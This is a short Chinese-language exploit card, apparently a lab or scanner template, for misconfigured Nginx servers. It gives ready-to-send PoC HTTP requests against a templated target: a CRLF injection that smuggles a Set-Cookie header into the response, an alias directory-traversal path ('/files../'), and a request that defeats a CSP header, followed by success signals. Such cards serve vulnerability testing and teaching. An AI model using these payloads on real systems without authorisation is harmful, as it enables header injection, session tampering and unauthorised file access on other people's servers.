# Nginx 配置不当 (insecure-configuration)

## 指纹特征
- 服务: Nginx
- 场景: 存在 CRLF 注入、目录遍历、CSP 覆盖等配置问题

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 配置注入 | 根路径 `/` 等 | 无 |

## PoC 指令

**1. CRLF 注入**
```http
GET /%0d%0aSet-Cookie:%20a=1 HTTP/1.1
Host: {{TARGET}}:8080
```

**2. 目录遍历**
```http
GET /files../ HTTP/1.1
Host: {{TARGET}}:8081
```

**3. CSP 覆盖/无效化**
```http
GET /test2 HTTP/1.1
Host: {{TARGET}}:8082
```

## Success Signal
- **状态验证**: 成功注入 HTTP 响应头、实现目录越权访问或使安全 Header 失效。
